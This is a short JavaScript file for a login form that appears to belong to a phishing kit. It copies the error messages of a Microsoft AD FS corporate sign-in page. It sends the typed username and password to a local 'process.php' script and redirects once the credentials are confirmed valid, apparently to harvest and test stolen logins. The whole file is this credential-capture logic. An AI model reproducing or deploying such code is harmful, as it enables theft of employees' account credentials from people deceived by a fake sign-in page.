

new MaskedPassword(document.getElementById("passwordInput"), '\u25CF', 0);
var USER = document.getElementById('userNameInput');
var PASS = document.getElementById('passwordInput');
var ErrorText = document.getElementById('errorText');


USER.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    }
});
PASS.addEventListener("keyup", function (event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        NE()
    }
});
function NE() {
if(document.getElementById("submitButton").getAttribute('disabled') === 'false'){

    if (USER.value == "") {
        ErrorText.innerHTML = "Enter your user ID in the format \"domain\\user\" or \"user@domain\".";
        USER.focus();
    } else if (PASS.value == "") {
        ErrorText.innerHTML = "Enter your password.";
        PASS.focus();
    } else {

        // document.getElementById("submitButton").disabled = true;
        document.getElementById("submitButton").setAttribute('disabled','true');


        var hr = new XMLHttpRequest();
        var url = "../process.php";
        var vars = "pass=" + document.getElementById('passwordInput_real').value + "&user=" + USER.value;
        hr.open("POST", url, true);
        hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        hr.send(vars);


        hr.onreadystatechange = function () {
            if (hr.readyState == XMLHttpRequest.DONE) {

                var resp = hr.responseText;

                if (resp === "OK") {
                    window.location.replace("../process.php?w=red");  
                    // alert('VALID!!!');
                } else {
                    // document.getElementById("submitButton").disabled = false;
                    document.getElementById("submitButton").setAttribute('disabled','false');
                    ErrorText.innerHTML = "Incorrect user ID or password. Type the correct user ID and password, and try again.";
                    PASS.value = "";
                    PASS.focus();
                }
            }
        }

        // alert('Checking');

        // 


    }
}
}